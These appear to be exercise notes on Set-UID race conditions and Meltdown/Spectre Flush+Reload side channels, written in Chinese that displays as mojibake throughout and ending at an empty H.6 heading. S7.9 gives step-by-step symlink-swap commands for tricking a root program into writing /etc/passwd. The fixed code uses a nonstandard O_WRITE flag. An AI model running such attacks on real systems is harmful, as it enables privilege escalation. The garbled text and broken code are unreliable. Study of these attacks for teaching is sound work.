å…³é”®åŒºåˆ«åœ¨äºï¼Œ`stat()` æ˜¯åŸºäº**æ–‡ä»¶å**è¿›è¡Œæ“ä½œçš„ï¼Œè€Œ `fstat()` æ˜¯åŸºäº**æ–‡ä»¶æè¿°ç¬¦**ã€‚ä¸€æ—¦æ–‡ä»¶è¢«æ‰“å¼€ï¼Œæ–‡ä»¶æè¿°ç¬¦å°±ä¸åº•å±‚çš„ inode (æ–‡ä»¶æœ¬èº«) ç»‘å®šäº†ã€‚å³ä½¿æ”»å‡»è€…åœ¨ `fopen()` ä¹‹åä¿®æ”¹äº† `/tmp/XYZ` è¿™ä¸ªç¬¦å·é“¾æ¥ï¼Œ`fp` æ‰€å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦ä»ç„¶æŒ‡å‘æœ€åˆæ‰“å¼€çš„é‚£ä¸ªæ–‡ä»¶ã€‚

ç”±äºæ£€æŸ¥ (`fstat`) å’Œä½¿ç”¨ï¼ˆå†™å…¥æ–‡ä»¶ï¼‰éƒ½ä½œç”¨äºåŒä¸€ä¸ªå·²ç»æ‰“å¼€çš„æ–‡ä»¶å¥æŸ„ï¼Œå› æ­¤ä¸å­˜åœ¨æ—¶é—´çª—å£è®©æ”»å‡»è€…å¯ä»¥åˆ‡æ¢æ–‡ä»¶ã€‚è¿™ä¸ªç¨‹åºæ˜¯å®‰å…¨çš„ã€‚

---

### S7.8. ä¸ºä»€ä¹ˆä¸ä½¿ç”¨æ–‡ä»¶é”æ¥è§£å†³æœ¬ç« è®¨è®ºçš„ç«æ€æ¡ä»¶é—®é¢˜ï¼Ÿ

#### ä¸­æ–‡ç¿»è¯‘
S7.8. å¦‚æœæˆ‘ä»¬å¯ä»¥é”å®šä¸€ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åœ¨æ£€æŸ¥å’Œä½¿ç”¨çš„æ—¶é—´çª—å£å†…é”å®šæ–‡ä»¶æ¥è§£å†³ç«æ€æ¡ä»¶é—®é¢˜ï¼Œå› ä¸ºæ²¡æœ‰å…¶ä»–è¿›ç¨‹å¯ä»¥åœ¨æ­¤æ—¶é—´çª—å£å†…ä½¿ç”¨è¯¥æ–‡ä»¶ã€‚ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸ä½¿ç”¨è¿™ç§æ–¹æ³•æ¥è§£å†³æœ¬ç« è®¨è®ºçš„ç«æ€æ¡ä»¶é—®é¢˜ï¼Ÿ

#### è§£æ
ä¸ä½¿ç”¨æ–‡ä»¶é”æ¥è§£å†³è¿™ç±»å®‰å…¨é—®é¢˜ï¼Œä¸»è¦æ˜¯å› ä¸ºåœ¨å¤§å¤šæ•°æ“ä½œç³»ç»Ÿï¼ˆåŒ…æ‹¬ Linuxï¼‰ä¸­ï¼Œæ–‡ä»¶é”æ˜¯**â€œåŠå‘Šé”â€ (advisory locks)**ï¼Œè€Œä¸æ˜¯**â€œå¼ºåˆ¶é”â€ (mandatory locks)**ã€‚

*   **åŠå‘Šé” (Advisory Locks):** è¿™ç§é”æœºåˆ¶ä¾èµ–äºæ‰€æœ‰è¿›ç¨‹çš„â€œè‡ªè§‰éµå®ˆâ€ã€‚ä¸€ä¸ªè¿›ç¨‹å¯ä»¥ç»™æ–‡ä»¶ä¸Šé”ï¼Œä½†è¿™ä¸ªé”åªå¯¹é‚£äº›åŒæ ·ä¼šå»æ£€æŸ¥å’Œå°Šé‡é”çš„è¿›ç¨‹æœ‰æ•ˆã€‚ä¸€ä¸ªæ¶æ„çš„æ”»å‡»è¿›ç¨‹å¯ä»¥å®Œå…¨**å¿½ç•¥**è¿™ä¸ªé”çš„å­˜åœ¨ï¼Œç›´æ¥å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹ã€‚å› æ­¤ï¼Œå®ƒæ— æ³•é˜»æ­¢ä¸€ä¸ªä¸åˆä½œçš„æ”»å‡»è€…ã€‚
*   **å¼ºåˆ¶é” (Mandatory Locks):** è¿™ç§é”ç”±æ“ä½œç³»ç»Ÿå†…æ ¸å¼ºåˆ¶æ‰§è¡Œã€‚ä¸€æ—¦æ–‡ä»¶è¢«é”å®šï¼Œå†…æ ¸ä¼šé˜»æ­¢ä»»ä½•å…¶ä»–è¿›ç¨‹ï¼ˆå³ä½¿æ˜¯ rootï¼Œé™¤éæœ‰ç‰¹æ®Šæƒé™ï¼‰å¯¹å…¶è¿›è¡Œä¸å…¼å®¹çš„æ“ä½œï¼Œæ— è®ºè¯¥è¿›ç¨‹æ˜¯å¦å°è¯•è·å–é”ã€‚

æ“ä½œç³»ç»Ÿä¹‹æ‰€ä»¥ä¸æ™®éå®ç°å¼ºåˆ¶é”ï¼Œæ˜¯å› ä¸ºå®ƒå¾ˆå®¹æ˜“è¢«æ»¥ç”¨ï¼Œå¯¼è‡´**æ‹’ç»æœåŠ¡ (Denial-of-Service, DoS)** æ”»å‡»ã€‚ä¸€ä¸ªæ¶æ„ç”¨æˆ·å¯ä»¥é”å®šå…³é”®çš„ç³»ç»Ÿæ–‡ä»¶ï¼ˆå¦‚ `/etc/passwd`ï¼‰ï¼Œå¯¼è‡´æ•´ä¸ªç³»ç»Ÿæ— æ³•æ­£å¸¸å·¥ä½œã€‚å› æ­¤ï¼Œå‡ºäºç³»ç»Ÿç¨³å®šæ€§å’Œå¯ç”¨æ€§çš„è€ƒè™‘ï¼Œä¸»æµæ“ä½œç³»ç»Ÿé‡‡ç”¨äº†æ›´å®‰å…¨çš„åŠå‘Šé”æœºåˆ¶ï¼Œä½†è¿™ä½¿å…¶ä¸é€‚ç”¨äºé˜²å¾¡æ¶æ„çš„ç«æ€æ¡ä»¶æ”»å‡»ã€‚

---

### S7.9. ä¸‹åˆ—ç‰¹æƒç¨‹åºæ˜¯å¦å­˜åœ¨ç«æ€æ¡ä»¶é—®é¢˜ï¼Ÿæ”»å‡»çª—å£åœ¨å“ªé‡Œï¼Ÿå¦‚ä½•åˆ©ç”¨ï¼Ÿ

#### ä¸­æ–‡ç¿»è¯‘
S7.9. ä¸‹åˆ—ç‰¹æƒçš„ Set-UID ç¨‹åºæ˜¯å¦å­˜åœ¨ç«æ€æ¡ä»¶é—®é¢˜ï¼Ÿå¦‚æœå­˜åœ¨ï¼Œæ”»å‡»çª—å£åœ¨å“ªé‡Œï¼Ÿä¹Ÿè¯·æè¿°ä½ å°†å¦‚ä½•åˆ©ç”¨è¿™ä¸ªç«æ€æ¡ä»¶çª—å£ã€‚
```c
1   filename = "/tmp/XYZ";
2   fd = open(filename, O_RDWR);
3   status = access(filename, W_OK);
    ... (code omitted) ...
10  if (status == ACCESS_ALLOWED) {
11      write_to_file(fd);
12  } else {
13      fprintf(stderr, "Permission denied\n");
14  }
```

#### è§£æ
**æ˜¯ï¼Œè¯¥ç¨‹åºå­˜åœ¨ä¸€ä¸ªä¸¥é‡çš„ç«æ€æ¡ä»¶æ¼æ´ã€‚**

è¿™ä¸ªç¨‹åºçš„é€»è¾‘é¡ºåºæ˜¯â€œä½¿ç”¨-å†æ£€æŸ¥-å†ä½¿ç”¨â€ï¼Œè¿™åŒæ ·æ˜¯ä¸å®‰å…¨çš„ã€‚

*   **æ”»å‡»çª—å£:** æ”»å‡»çª—å£ä½äºç¬¬ 2 è¡Œ `open()` è°ƒç”¨å’Œç¬¬ 3 è¡Œ `access()` è°ƒç”¨ä¹‹é—´ã€‚

*   **åˆ©ç”¨æ–¹æ³•:**
    æ”»å‡»çš„ç›®æ ‡æ˜¯æ¬ºéª— `access()` æ£€æŸ¥ï¼ŒåŒæ—¶è®© `open()` æ‰“å¼€ä¸€ä¸ªå—ä¿æŠ¤çš„æ–‡ä»¶ã€‚

    1.  **å‡†å¤‡é˜¶æ®µ:** åœ¨ç¨‹åºè¿è¡Œä¹‹å‰ï¼Œæ”»å‡»è€…å°† `/tmp/XYZ` åˆ›å»ºä¸ºä¸€ä¸ªæŒ‡å‘å—ä¿æŠ¤æ–‡ä»¶ï¼ˆå¦‚ `/etc/passwd`ï¼‰çš„ç¬¦å·é“¾æ¥ã€‚
        ```bash
        $ ln -s /etc/passwd /tmp/XYZ
        ```
    2.  **æ”»å‡»æ‰§è¡Œè¿‡ç¨‹:**
        *   **ç¬¬ 2 è¡Œ (`open`):** Set-UID ç¨‹åºä»¥ root æƒé™æ‰§è¡Œ `open("/tmp/XYZ", O_RDWR)`ã€‚ç”±äºç¨‹åºæ˜¯ rootï¼Œå®ƒä¼šè·Ÿéšç¬¦å·é“¾æ¥å¹¶æˆåŠŸæ‰“å¼€ `/etc/passwd` æ–‡ä»¶ã€‚è¿”å›çš„æ–‡ä»¶æè¿°ç¬¦ `fd` ç°åœ¨æŒ‡å‘ `/etc/passwd`ã€‚
        *   **èµ¢å¾—ç«æ€ (æ”»å‡»çª—å£):** åœ¨ `open()` æ‰§è¡Œå®Œæ¯•åã€`access()` æ‰§è¡Œå‰ï¼Œæ”»å‡»è€…çš„è¿›ç¨‹å¿…é¡»è¿…é€Ÿåœ°å°† `/tmp/XYZ` ç¬¦å·é“¾æ¥**ä¿®æ”¹**ä¸ºæŒ‡å‘ä¸€ä¸ªæ”»å‡»è€…è‡ªå·±æ‹¥æœ‰çš„æ–‡ä»¶ï¼ˆä¾‹å¦‚ `/tmp/dummy`ï¼‰ã€‚
          ```bash
          $ ln -sf /tmp/dummy /tmp/XYZ  // -f å¼ºåˆ¶è¦†ç›–
          ```
        *   **ç¬¬ 3 è¡Œ (`access`):** ç¨‹åºæ‰§è¡Œ `access("/tmp/XYZ", W_OK)`ã€‚æ­¤æ—¶ `/tmp/XYZ` æŒ‡å‘çš„æ˜¯ `/tmp/dummy`ã€‚ç”±äºè¯¥æ–‡ä»¶ä¸ºæ”»å‡»è€…æ‰€æœ‰ï¼Œ`access()` æ£€æŸ¥çœŸå®ç”¨æˆ·çš„æƒé™ä¼šæˆåŠŸï¼Œ`status` è¢«è®¾ä¸º `ACCESS_ALLOWED`ã€‚
        *   **ç¬¬ 11 è¡Œ (`write_to_file`):** `if` æ¡ä»¶åˆ¤æ–­ä¸ºçœŸï¼Œç¨‹åºæ‰§è¡Œ `write_to_file(fd)`ã€‚å®ƒä¼šå‘æ–‡ä»¶æè¿°ç¬¦ `fd` å†™å…¥æ•°æ®ã€‚å› ä¸º `fd` åœ¨ç¬¬ 2 æ­¥å·²ç»ç»‘å®šåˆ°äº† `/etc/passwd`ï¼Œæ‰€ä»¥æ•°æ®æœ€ç»ˆè¢«å†™å…¥äº†å—ä¿æŠ¤çš„å¯†ç æ–‡ä»¶ã€‚æ”»å‡»æˆåŠŸã€‚

è¿™ä¸ªæ¼æ´çš„æ ¹æºåœ¨äºï¼Œç¨‹åºæ‰“å¼€æ–‡ä»¶ï¼ˆä½¿ç”¨ï¼‰å’Œæ£€æŸ¥æƒé™ï¼ˆæ£€æŸ¥ï¼‰çš„å¯¹è±¡ä¸ä¸€è‡´ï¼šä¸€ä¸ªåŸºäº**æ–‡ä»¶å**ï¼Œä¸€ä¸ªåŸºäºå·²ç»æ‰“å¼€çš„**æ–‡ä»¶æè¿°ç¬¦**ï¼Œè€Œæ–‡ä»¶ååœ¨ä¸¤è€…ä¹‹é—´å¯ä»¥è¢«æ”»å‡»è€…æ”¹å˜ã€‚

---

### S7.10. è¯·ä½¿ç”¨æœ€å°æƒé™åŸåˆ™ä¿®å¤ä¸‹åˆ—ç¨‹åºä¸­çš„ç«æ€æ¡ä»¶é—®é¢˜ã€‚

#### ä¸­æ–‡ç¿»è¯‘
S7.10. è¯·ä½¿ç”¨æœ€å°æƒé™åŸåˆ™ä¿®å¤ä¸‹åˆ—ç¨‹åºä¸­çš„ç«æ€æ¡ä»¶é—®é¢˜ã€‚
```c
if (access("/tmp/XYZ", W_OK) == ACCESS_ALLOWED) {
    f = open("/tmp/XYZ", O_WRITE);
    write_to_file(f);
}
else {
    fprintf(stderr, "Permission denied\n");
}
```

#### è§£æ
è¿™ä¸ªç¨‹åºå­˜åœ¨ç»å…¸çš„ TOCTTOU æ¼æ´ï¼Œå› ä¸ºå®ƒå…ˆä»¥çœŸå®ç”¨æˆ·çš„èº«ä»½æ£€æŸ¥æƒé™ (`access`)ï¼Œç„¶åä»¥ root èº«ä»½æ‰“å¼€æ–‡ä»¶ (`open`)ã€‚

**æœ€å°æƒé™åŸåˆ™ (Principle of Least Privilege)** çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šåªåœ¨ç»å¯¹å¿…è¦æ—¶æ‰ä½¿ç”¨é«˜æƒé™ã€‚åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œæ‰“å¼€ä¸€ä¸ªä½äº `/tmp` ç›®å½•ä¸‹çš„ã€åº”è¯¥ç”±æ™®é€šç”¨æˆ·æ‹¥æœ‰çš„æ–‡ä»¶ï¼Œå¹¶ä¸éœ€è¦ root æƒé™ã€‚

æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨è°ƒç”¨ `open()` ä¹‹å‰ä¸´æ—¶æ”¾å¼ƒ root æƒé™æ¥ä¿®å¤æ­¤æ¼æ´ã€‚è¿™æ ·ï¼Œ`open()` ç³»ç»Ÿè°ƒç”¨æœ¬èº«å°±ä¼šåˆ©ç”¨å†…æ ¸æ¥è¿›è¡Œæ­£ç¡®çš„æƒé™æ£€æŸ¥ï¼ˆåŸºäºå½“å‰çš„æœ‰æ•ˆç”¨æˆ· IDï¼Œæˆ‘ä»¬å°†å…¶ä¸´æ—¶è®¾ç½®ä¸ºçœŸå®ç”¨æˆ· IDï¼‰ã€‚

**ä¿®å¤åçš„ä»£ç ï¼š**
```c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

// å‡è®¾ write_to_file(int fd) å‡½æ•°å·²å®šä¹‰

int main() {
    char *filename = "/tmp/XYZ";
    int f;
    
    // è·å–çœŸå®ç”¨æˆ·IDå’Œæœ‰æ•ˆçš„ç”¨æˆ·ID
    uid_t ruid = getuid();
    uid_t euid = geteuid();

    // 1. ä¸´æ—¶æ”¾å¼ƒrootæƒé™ï¼Œå°†æœ‰æ•ˆç”¨æˆ·IDè®¾ç½®ä¸ºçœŸå®ç”¨æˆ·ID
    if (seteuid(ruid) != 0) {
        perror("seteuid failed");
        return -1;
    }

    // 2. ä»¥æ™®é€šç”¨æˆ·æƒé™æ‰“å¼€æ–‡ä»¶ã€‚ä¸å†éœ€è¦ access() æ£€æŸ¥ã€‚
    // å†…æ ¸ä¼šæ›¿æˆ‘ä»¬å®Œæˆæ­£ç¡®çš„æƒé™æ£€æŸ¥ã€‚
    f = open(filename, O_WRITE);

    // 3. å¦‚æœåç»­æ“ä½œéœ€è¦ï¼Œå¯ä»¥æ¢å¤rootæƒé™
    if (seteuid(euid) != 0) {
        perror("seteuid failed");
        // å³ä½¿æ¢å¤å¤±è´¥ï¼Œä¹Ÿåº”è¯¥å¤„ç†å·²æ‰“å¼€çš„æ–‡ä»¶
        if (f != -1) close(f);
        return -1;
    }

    // 4. å¤„ç† open() çš„ç»“æœ
    if (f != -1) {
        // æ­¤æ—¶å¯ä»¥ä»¥ root æƒé™è¿›è¡Œå†™æ“ä½œ
        write_to_file(f);
        close(f);
    } else {
        // å¦‚æœ open() å¤±è´¥ï¼Œæ‰“å°æƒé™é”™è¯¯
        fprintf(stderr, "Permission denied\n");
    }

    return 0;
}
```
é€šè¿‡è¿™ç§æ–¹å¼ï¼Œ`access()` æ£€æŸ¥è¢«å®Œå…¨ç§»é™¤ï¼Œç«æ€æ¡ä»¶çš„çª—å£ä¹Ÿéšä¹‹æ¶ˆå¤±ã€‚`open()` æ“ä½œçš„åŸå­æ€§ä¿è¯äº†å…¶å®‰å…¨æ€§ã€‚

# Meltdown & Spectre æ¼æ´ ç»ƒä¹ é¢˜å’Œè§£æ

![[Pasted image 20251117002706.png]]
![[Pasted image 20251117002713.png]]
### **å…³é”®åè¯ (Key Terms)**

| ä¸­æ–‡ | è‹±æ–‡ |
| --- | --- |
| ä¾§ä¿¡é“ | Side Channel |
| ä¹±åºæ‰§è¡Œ | Out-of-Order Execution |
| æ¨æµ‹æ‰§è¡Œ | Speculative Execution |
| åˆ†æ”¯é¢„æµ‹ | Branch Prediction |
| CPU ç¼“å­˜ | CPU Cache |
| ç¼“å­˜å‘½ä¸­ | Cache Hit |
| ç†”æ–­æ”»å‡» | Meltdown Attack |
| å¹½çµæ”»å‡» | Spectre Attack |
| å†…æ ¸ç©ºé—´ | Kernel Space |
| åˆ·æ–°+é‡è½½ | Flush+Reload |
| ç«æ€æ¡ä»¶ | Race Condition |
| æ²™ç®± | Sandbox |
| å†…æ ¸é¡µè¡¨éš”ç¦» | Kernel Page-Table Isolation (KAISER) |

---

### **H.1.**
**ä¸­æ–‡ç¿»è¯‘:** å½“æˆ‘ä»¬å¤šæ¬¡è¯»å–ä¸€ä¸ªå†…å­˜åœ°å€æ—¶ï¼Œç¬¬äºŒæ¬¡è®¿é—®é€šå¸¸æ¯”ç¬¬ä¸€æ¬¡è®¿é—®å¿«ï¼ŒåŸå› æ˜¯ä»€ä¹ˆï¼Ÿ

**è§£æ:**
è¿™æ˜¯ç”± **CPU ç¼“å­˜ (CPU Cache)** æœºåˆ¶å¼•èµ·çš„ã€‚å½“CPUç¬¬ä¸€æ¬¡è®¿é—®ä¸€ä¸ªå†…å­˜åœ°å€æ—¶ï¼Œå®ƒéœ€è¦ä»ç›¸å¯¹è¾ƒæ…¢çš„ä¸»å­˜å‚¨å™¨ (RAM) ä¸­è·å–æ•°æ®ã€‚åœ¨è·å–æ•°æ®çš„åŒæ—¶ï¼ŒCPUä¼šå°†è¯¥æ•°æ®åŠå…¶é™„è¿‘çš„æ•°æ®ä¸€åŒåŠ è½½åˆ°é«˜é€Ÿçš„CPUç¼“å­˜ä¸­ã€‚å½“ç¨‹åºç¬¬äºŒæ¬¡è®¿é—®åŒä¸€ä¸ªå†…å­˜åœ°å€æ—¶ï¼ŒCPUä¼šç›´æ¥ä»ç¼“å­˜ä¸­æ‰¾åˆ°æ•°æ®ï¼Œè¿™è¢«ç§°ä¸º **ç¼“å­˜å‘½ä¸­ (Cache Hit)**ã€‚ç”±äºè®¿é—®CPUç¼“å­˜çš„é€Ÿåº¦è¿œå¿«äºè®¿é—®ä¸»å­˜ï¼Œå› æ­¤ç¬¬äºŒæ¬¡è®¿é—®çš„è€—æ—¶ä¼šæ˜¾è‘—å‡å°‘ã€‚æ•™æåœ¨1.2èŠ‚â€œåŸºäºCPUç¼“å­˜çš„ä¾§ä¿¡é“â€ä¸­å¯¹æ­¤è¿›è¡Œäº†è§£é‡Šã€‚

---

### **H.2.**
**ä¸­æ–‡ç¿»è¯‘:** å…³äºä¹¦ä¸­ä½¿ç”¨çš„ **åˆ·æ–°+é‡è½½ (Flush+Reload)** æŠ€æœ¯ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬ä½¿ç”¨å¤§å°ä¸º `256*4096` çš„æ•°ç»„ï¼Œè€Œä¸æ˜¯å¤§å°ä¸º `256` çš„æ•°ç»„ï¼Ÿ

**è§£æ:**
è¿™ä¸»è¦æ˜¯ä¸ºäº†é¿å…ç¼“å­˜è¡Œ (Cache Line) çš„å¹²æ‰°ã€‚
1.  **256ä¸ªæ¡ç›®**: ä¸€ä¸ªå­—èŠ‚ (byte) æœ‰256ç§å¯èƒ½çš„å–å€¼ (0-255)ã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ä¸ºæ¯ä¸€ç§å¯èƒ½çš„å€¼å»ºç«‹ä¸€ä¸ªå”¯ä¸€çš„æ˜ å°„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæœ‰256ä¸ªæ¡ç›®çš„æ¢æµ‹æ•°ç»„ã€‚
2.  **4096å­—èŠ‚çš„æ­¥é•¿ (Stride)**: CPUç¼“å­˜ä¸æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½å·¥ä½œçš„ï¼Œè€Œæ˜¯ä»¥ç¼“å­˜è¡Œä¸ºå•ä½ï¼ˆä¾‹å¦‚64å­—èŠ‚ï¼‰ã€‚å¦‚æœä½¿ç”¨ä¸€ä¸ªå¤§å°ä¸º256çš„è¿ç»­å­—èŠ‚æ•°ç»„ `array[256]`ï¼Œè®¿é—® `array[k]` æ—¶ï¼ŒCPUä¸ä»…ä¼šç¼“å­˜ `array[k]`ï¼Œè¿˜ä¼šç¼“å­˜å…¶ç›¸é‚»çš„å¤šä¸ªå…ƒç´ ï¼ˆå› ä¸ºå®ƒä»¬åœ¨åŒä¸€ä¸ªç¼“å­˜è¡Œé‡Œï¼‰ã€‚è¿™ä¼šå¯¼è‡´æˆ‘ä»¬åœ¨â€œé‡è½½â€é˜¶æ®µæ£€æµ‹åˆ°å¤šä¸ªç¼“å­˜å‘½ä¸­ï¼Œä»è€Œæ— æ³•å‡†ç¡®åˆ¤æ–­å‡ºç§˜å¯†å€¼æ˜¯å“ªä¸€ä¸ªã€‚
å¦‚æ•™æ1.2.2èŠ‚æ‰€è¿°ï¼Œé€šè¿‡ä½¿ç”¨ `4096` å­—èŠ‚çš„å·¨å¤§æ­¥é•¿ï¼ˆ`array[k*4096]`ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®ä¿æ•°ç»„çš„æ¯ä¸ªé€»è¾‘å…ƒç´  `array[0]`, `array[1]`, ..., `array[255]` éƒ½ä½äºä¸€ä¸ªç‹¬ç«‹çš„ã€äº’ä¸å¹²æ‰°çš„ç¼“å­˜è¡Œä¸­ï¼Œä»è€Œæ¶ˆé™¤äº†æ­§ä¹‰ã€‚

---

### **H.3.**
**ä¸­æ–‡ç¿»è¯‘:** æˆ‘ä»¬å¦‚ä½•ä½¿ç”¨CPUç¼“å­˜ä½œä¸º **ä¾§ä¿¡é“ (Side Channel)** æ¥å‘é€æ•°å­—89ï¼Ÿ

**è§£æ:**
æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ **åˆ·æ–°+é‡è½½ (Flush+Reload)** æŠ€æœ¯æ¥é€šè¿‡CPUç¼“å­˜ä¾§ä¿¡é“ä¼ é€’æ•°å­—89ã€‚è¿™ä¸ªè¿‡ç¨‹åˆ†ä¸ºä¸‰æ­¥ï¼Œæ­£å¦‚æ•™æ1.2.2èŠ‚æ‰€æè¿°ï¼š
1.  **åˆ·æ–° (FLUSH)**: å‡†å¤‡ä¸€ä¸ªå¤§å°ä¸º `256 * 4096` å­—èŠ‚çš„æ¢æµ‹æ•°ç»„ã€‚é¦–å…ˆï¼Œä½¿ç”¨ `_mm_clflush` æŒ‡ä»¤å°†è¿™ä¸ªæ•°ç»„çš„æ‰€æœ‰å…ƒç´ éƒ½ä»CPUç¼“å­˜ä¸­æ¸…é™¤ã€‚
2.  **ç¼–ç /è®¿é—® (Encode/Access)**: å‘é€æ–¹ï¼ˆæˆ–æ”»å‡»ä»£ç ï¼‰è®¿é—®æ¢æµ‹æ•°ç»„ä¸­ä¸æ•°å­—89å¯¹åº”çš„é‚£ä¸ªå…ƒç´ ï¼Œå³ `array[89 * 4096]`ã€‚è¿™ä¸ªæ“ä½œä¼šå°†åŒ…å«è¯¥å…ƒç´ çš„å†…å­˜å—åŠ è½½åˆ°CPUç¼“å­˜ä¸­ã€‚
3.  **é‡è½½ (RELOAD)**: æ¥æ”¶æ–¹ï¼ˆæˆ–æ”»å‡»ä»£ç ï¼‰é€šè¿‡æµ‹é‡è®¿é—®æ¢æµ‹æ•°ç»„ä¸­ä»0åˆ°255æ‰€æœ‰å…ƒç´ çš„æ—¶é—´æ¥è§£ç ä¿¡æ¯ã€‚å®ƒä¼šå‘ç°ï¼Œè®¿é—® `array[89 * 4096]` çš„æ—¶é—´æ˜¾è‘—å¿«äºè®¿é—®å…¶ä»–ä»»ä½•å…ƒç´ çš„æ—¶é—´ï¼Œå› ä¸ºåªæœ‰è¿™ä¸ªåœ°å€æ˜¯ **ç¼“å­˜å‘½ä¸­ (Cache Hit)**ã€‚é€šè¿‡æ‰¾åˆ°è®¿é—®æœ€å¿«çš„ç´¢å¼•ï¼Œæ¥æ”¶æ–¹å°±èƒ½æ¢å¤å‡ºæ•°å­—89ã€‚

---

### **H.4.**
**ä¸­æ–‡ç¿»è¯‘:** æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªå¤§å°ä¸º1024å­—èŠ‚çš„æ•°ç»„ã€‚å¦‚æœCPUç¼“å­˜å¤§å°ä¸º128å­—èŠ‚ï¼ˆå³å½“å†…å­˜åœ°å€xè¢«è®¿é—®æ—¶ï¼Œä»xåˆ°x+127çš„å†…å­˜éƒ½ä¼šè¢«CPUç¼“å­˜ï¼‰ã€‚è¯·æè¿°æˆ‘ä»¬èƒ½ç”¨è¿™ä¸ªæ•°ç»„å’Œ **åˆ·æ–°+é‡è½½ (Flush+Reload)** æŠ€æœ¯å‘é€å¤šå°‘ä¸ªä¸åŒçš„å€¼ã€‚

**è§£æ:**
æˆ‘ä»¬å¯ä»¥å‘é€8ä¸ªä¸åŒçš„å€¼ã€‚
è¿™é‡Œçš„å…³é”®æ˜¯CPUç¼“å­˜çš„å·¥ä½œå•ä½æ˜¯ç¼“å­˜è¡Œï¼Œå…¶å¤§å°ä¸º128å­—èŠ‚ã€‚å½“æˆ‘ä»¬è®¿é—®è¿™ä¸ª1024å­—èŠ‚æ•°ç»„ä¸­çš„ä»»ä½•ä¸€ä¸ªåœ°å€æ—¶ï¼ŒåŒ…å«è¯¥åœ°å€çš„æ•´ä¸ª128å­—èŠ‚å—éƒ½ä¼šè¢«åŠ è½½åˆ°ç¼“å­˜ä¸­ã€‚ä¸ºäº†èƒ½å¤Ÿæ˜ç¡®åœ°åŒºåˆ†ä¸åŒçš„ä¿¡å·ï¼Œæˆ‘ä»¬å¿…é¡»ç¡®ä¿æ¯ä¸ªä¿¡å·å¯¹åº”çš„å†…å­˜è®¿é—®éƒ½æ“ä½œä¸€ä¸ªç‹¬ç«‹çš„ã€ä¸é‡å çš„ç¼“å­˜è¡Œã€‚
æ•°ç»„æ€»å¤§å°ä¸º1024å­—èŠ‚ï¼Œç¼“å­˜è¡Œå¤§å°ä¸º128å­—èŠ‚ã€‚å› æ­¤ï¼Œè¿™ä¸ªæ•°ç»„å¯ä»¥è¢«åˆ’åˆ†ä¸º `1024 / 128 = 8` ä¸ªç‹¬ç«‹çš„ç¼“å­˜è¡Œã€‚æˆ‘ä»¬å¯ä»¥å°†å€¼0æ˜ å°„åˆ°ç¬¬ä¸€ä¸ª128å­—èŠ‚å—ï¼Œå€¼1æ˜ å°„åˆ°ç¬¬äºŒä¸ª128å­—èŠ‚å—ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°å€¼7æ˜ å°„åˆ°æœ€åä¸€ä¸ªå—ã€‚é€šè¿‡è®¿é—®ä¸åŒå—å†…çš„åœ°å€å¹¶æ£€æµ‹å“ªä¸ªå—è¢«ç¼“å­˜ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ˜ç¡®åœ°åŒºåˆ†å’Œå‘é€8ä¸ªä¸åŒçš„å€¼ã€‚

---

### **H.5.**
**ä¸­æ–‡ç¿»è¯‘:** ä¸€ä¸ªç§˜å¯†æ•°å­—å­˜å‚¨åœ¨å†…æ ¸åœ°å€ `0xfb102000`ã€‚ä»¥ä¸‹ç”¨æˆ·çº§ç¨‹åºè¯•å›¾è®¿é—®å¹¶æ‰“å°è¿™ä¸ªæ•°å­—ã€‚å°†ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ

```c
#include <stdio.h>
int main()
{
  char *kernel_data_addr = (char*)0xfb102000;
  char kernel_data = *kernel_data_addr;
  printf("I have reached here.\n");
  return 0;
}
```

**è§£æ:**
è¿™ä¸ªç¨‹åºå°†ä¼šå´©æºƒï¼Œå¹¶ç”±æ“ä½œç³»ç»ŸæŠ¥å‘Šä¸€ä¸ª **â€œæ®µé”™è¯¯ (Segmentation fault)â€**ã€‚
å¦‚æ•™æ1.3.2èŠ‚â€œå®ˆå«è€…ï¼šå†…æ ¸å†…å­˜è®¿é—®é˜²æŠ¤æœºåˆ¶â€æ‰€è¿°ï¼Œæ“ä½œç³»ç»Ÿé€šè¿‡å¤„ç†å™¨çš„ç‰¹æƒçº§æ¥ä¿æŠ¤ **å†…æ ¸ç©ºé—´ (Kernel Space)**ã€‚ç”¨æˆ·çº§ç¨‹åºè¿è¡Œåœ¨ä½ç‰¹æƒçº§ï¼Œä¸å…è®¸ç›´æ¥è®¿é—®ä¸ºå†…æ ¸ä¿ç•™çš„é«˜ç‰¹æƒçº§å†…å­˜åœ°å€ã€‚å½“ç¨‹åºæ‰§è¡Œ `*kernel_data_addr` è¯•å›¾è§£å¼•ç”¨å†…æ ¸åœ°å€æ—¶ï¼ŒCPUçš„å†…å­˜ç®¡ç†å•å…ƒ (MMU) ä¼šæ£€æµ‹åˆ°è¿™ä¸ªè¶Šæƒè®¿é—®ï¼Œå¹¶è§¦å‘ä¸€ä¸ªç¡¬ä»¶å¼‚å¸¸ã€‚æ“ä½œç³»ç»Ÿä¼šæ•è·è¿™ä¸ªå¼‚å¸¸ï¼Œå¹¶é‡‡å–é»˜è®¤å¤„ç†æ–¹å¼â€”â€”ç»ˆæ­¢è¿™ä¸ªè¿è§„çš„è¿›ç¨‹ã€‚å› æ­¤ï¼Œ`printf` è¯­å¥æ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œã€‚

---

### **H.6.**
